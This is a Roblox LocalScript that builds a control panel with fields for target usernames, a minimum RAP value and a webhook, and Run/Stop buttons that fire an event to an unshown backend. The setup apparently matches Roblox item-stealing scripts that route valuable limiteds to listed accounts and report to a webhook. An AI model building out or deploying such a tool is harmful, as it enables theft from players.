-- gui.lua (LocalScript) — place this inside StarterGui -> ScreenGui
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local EVENT_NAME = "ScriptControlEvent"
local controlEvent = ReplicatedStorage:WaitForChild(EVENT_NAME)

-- UI factory
local function New(class, props)
    local o = Instance.new(class)
    for k,v in pairs(props or {}) do o[k] = v end
    return o
end

-- Root
local screenGui = script.Parent
if not screenGui or not screenGui:IsA("ScreenGui") then
    screenGui = New("ScreenGui",{Name="ControlPanelGUI", Parent = player:WaitForChild("PlayerGui"), ResetOnSpawn = false})
    script.Parent = screenGui
end

-- (Create simple compact UI: a textbox for users, min rap, webhook, Run/Stop)
local frame = New("Frame",{Parent=screenGui, Size=UDim2.new(0,420,0,320), Position=UDim2.new(0.5,-210,0.5,-160), BackgroundColor3=Color3.fromRGB(30,30,30)})
New("UICorner",{Parent=frame, CornerRadius=UDim.new(0,8)})

local runBtn = New("TextButton",{Parent=frame, Size=UDim2.new(0.4,0,0,36), Position=UDim2.new(0.05,0,0.85,0), Text="Run", Font=Enum.Font.GothamBold, TextSize=18, BackgroundColor3=Color3.fromRGB(67,156,255), TextColor3=Color3.new(1,1,1)})
local stopBtn = New("TextButton",{Parent=frame, Size=UDim2.new(0.4,0,0,36), Position=UDim2.new(0.55,0,0.85,0), Text="Stop", Font=Enum.Font.GothamBold, TextSize=18, BackgroundColor3=Color3.fromRGB(220,80,80), TextColor3=Color3.new(1,1,1)})

-- simple inputs (for brevity)
local usersBox = New("TextBox",{Parent=frame, Size=UDim2.new(0.9,0,0,120), Position=UDim2.new(0.05,0,0.12,0), Text = table.concat(_G.Usernames or {"ilovemyamazing_gf1","Yeahboi1131"}, "\n"), ClearTextOnFocus=false, TextWrapped=true, BackgroundColor3=Color3.fromRGB(18,18,18), TextColor3=Color3.new(1,1,1)})
local minBox = New("TextBox",{Parent=frame, Size=UDim2.new(0.45,0,0,28), Position=UDim2.new(0.05,0,0.6,0), Text=tostring(_G.minrap or 1000000), ClearTextOnFocus=false, BackgroundColor3=Color3.fromRGB(18,18,18), TextColor3=Color3.new(1,1,1)})
local webBox = New("TextBox",{Parent=frame, Size=UDim2.new(0.45,0,0,28), Position=UDim2.new(0.5,0,0.6,0), Text=tostring(_G.webhook or ""), ClearTextOnFocus=false, BackgroundColor3=Color3.fromRGB(18,18,18), TextColor3=Color3.new(1,1,1)})

local function fireRun()
    local users_text = usersBox.Text
    local userlines = {}
    for line in users_text:gmatch("[^\r\n]+") do
        local t = line:gsub("^%s*(.-)%s*$","%1")
        if t ~= "" then table.insert(userlines, t) end
    end
    local payload = { action = "run", opts = { users = userlines, min_rap = tonumber(minBox.Text) or 1000000, webhook = webBox.Text or "" } }
    pcall(function() controlEvent:Fire(payload) end)
end

local function fireStop()
    pcall(function() controlEvent:Fire({ action = "stop" }) end)
end

runBtn.MouseButton1Click:Connect(function()
    runBtn.Text = "Running..."
    runBtn.Active = false
    task.spawn(function()
        fireRun()
        wait(0.5)
        runBtn.Text = "Run"
        runBtn.Active = true
    end)
end)
stopBtn.MouseButton1Click:Connect(fireStop)
